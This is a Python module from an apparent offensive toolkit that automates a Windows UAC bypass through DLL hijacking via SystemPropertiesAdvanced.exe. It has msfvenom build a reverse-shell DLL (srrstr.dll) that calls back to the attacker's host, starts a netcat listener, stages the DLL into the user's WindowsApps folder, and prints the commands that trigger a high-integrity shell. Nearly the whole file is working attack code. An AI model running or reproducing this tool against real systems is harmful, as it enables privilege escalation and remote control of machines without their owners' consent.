import subprocess
from pathlib import Path

from modules.upload.windows import stage_windows_files
from core.attacker import resolve_lhost

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
W_BOLD = '\033[1m'

# =========================================================
# PATHS
# =========================================================

BASE_DIR = Path(__file__).resolve().parents[3]

PAYLOAD_DIR = (
    BASE_DIR /
    "payloads" /
    "windows" /
    "uac"
)

PAYLOAD_DIR.mkdir(
    parents=True,
    exist_ok=True,
)

DLL = PAYLOAD_DIR / "srrstr.dll"

# =========================================================
# HELPERS
# =========================================================

def start_listener(port):

    try:

        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                f"nc -lvnp {port}"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(
            f"\n{G}[+]{W} "
            f"Listener started on "
            f"{Y}{port}{W}"
        )

        return True

    except Exception as e:

        print(
            f"\n{R}[!] Failed to start listener:{W} {e}"
        )

        return False


def check_build():

    try:

        build = input(
            f"\n{B}build/version{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return None

    if not build:
        return None

    try:

        if "." in build:

            build = build.split(".")[-1]

        build = int(build)

    except Exception:

        return None

    return build


def check_uac():

    print(
        f"\n{B}[*]{W} "
        f"UAC ENUMERATION\n"
    )

    print(
        f"  {B}├──{W} "
        f"REG QUERY "
        f"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\"
        f"Windows\\CurrentVersion\\Policies\\System\\ "
        f"/v EnableLUA"
    )

    print(
        f"  {B}└──{W} "
        f"REG QUERY "
        f"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\"
        f"Windows\\CurrentVersion\\Policies\\System\\ "
        f"/v ConsentPromptBehaviorAdmin"
    )

    try:

        level = input(
            f"\n{B}ConsentPromptBehaviorAdmin{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return None

    return level


# =========================================================
# MENU
# =========================================================

def render_menu():

    print(
        f"\n{B}[*]{W} "
        f"UAC BYPASS ATTACKS\n"
    )

    print(
        f"  {B}├──{W} "
        f"[1] SystemPropertiesAdvanced"
    )

    print(
        f"  {B}└──{W} "
        f"[2] Cleanup"
    )


# =========================================================
# SYSTEMPROPERTIESADVANCED
# =========================================================

def systempropertiesadvanced_flow(args):

    lhost = resolve_lhost(args)

    lport = 8443

    if not lhost:
        return

    try:

        username = input(
            f"\n{B}username{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return

    if not username:
        return

    windowsapps = (
        f"C:\\Users\\{username}\\"
        f"AppData\\Local\\Microsoft\\WindowsApps"
    )    


    # =====================================================
    # GENERATE DLL
    # =====================================================

    cmd = [

        "msfvenom",

        "-p",
        "windows/shell_reverse_tcp",

        f"LHOST={lhost}",
        f"LPORT={lport}",

        "-f",
        "dll",

        "-o",
        str(DLL),

    ]

    print(
        f"\n{B}[*]{W} "
        f"GENERATING DLL PAYLOAD"
    )

    try:

        subprocess.run(
            cmd,
            check=True,
        )

    except Exception as e:

        print(
            f"\n{R}[!] "
            f"msfvenom failed:{W} {e}"
        )

        return

    print(
        f"\n{G}[+]{W} "
        f"Payload generated"
    )

    print(f"  {DLL}")

    # =====================================================
    # LISTENER
    # =====================================================

    start_listener(lport)

    # =====================================================
    # TRANSFER
    # =====================================================

    print(
        f"\n{B}[*]{W} "
        f"STARTING TRANSFER"
    )

    stage_windows_files(

        [str(DLL)],

        remote_dir=windowsapps

    )

    # =====================================================
    # CLEAN OLD RUNDLL32
    # =====================================================

    print(
        f"\n{Y}"
        f"┌── CLEANUP OLD RUNDLL32 "
        f"────────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f'tasklist /svc | findstr "rundll32"'
    )

    print(
        f"{Y}│{W} "
        f"taskkill /PID PID /F"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    # =====================================================
    # EXECUTE
    # =====================================================

    print(
        f"\n{G}"
        f"┌── EXECUTE UAC BYPASS "
        f"────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"C:\\Windows\\SysWOW64\\"
        f"SystemPropertiesAdvanced.exe"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    # =====================================================
    # EXPECTED RESULT
    # =====================================================

    print(
        f"\n{Y}"
        f"┌── EXPECTED RESULT "
        f"────────────────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f"High integrity reverse shell"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# CLEANUP
# =========================================================

def cleanup_flow():

    print(
        f"\n{G}"
        f"┌── CLEANUP "
        f"──────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"del "
        f"C:\\Users\\USER\\AppData\\Local\\"
        f"Microsoft\\WindowsApps\\srrstr.dll"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# MAIN
# =========================================================

def run(data=None, cred=None, args=None):

    print(
        f"\n{W_BOLD}"
        f"[*] WINDOWS UAC BYPASS MATCHER{W}"
    )

    build = check_build()

    if not build:
        return data

    print(
        f"\n{B}[*]{W} "
        f"TARGET\n"
    )

    print(
        f"  {B}├──{W} "
        f"Build: {build}"
    )

    level = check_uac()

    if level:

        print(
            f"  {B}└──{W} "
            f"ConsentPromptBehaviorAdmin: {level}"
        )

    # =====================================================
    # BUILD CHECK
    # =====================================================

    if build < 14393:

        print(
            f"\n{R}[!] "
            f"Technique may not work "
            f"on this build.{W}"
        )

    else:

        print(
            f"\n{G}[+] "
            f"SystemPropertiesAdvanced "
            f"appears compatible.{W}"
        )

    render_menu()

    try:

        choice = input(
            f"\n{B}select{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return data

    # =====================================================
    # SYSTEMPROPERTIESADVANCED
    # =====================================================

    if choice == "1":

        systempropertiesadvanced_flow(args)

    # =====================================================
    # CLEANUP
    # =====================================================

    elif choice == "2":

        cleanup_flow()

    return data
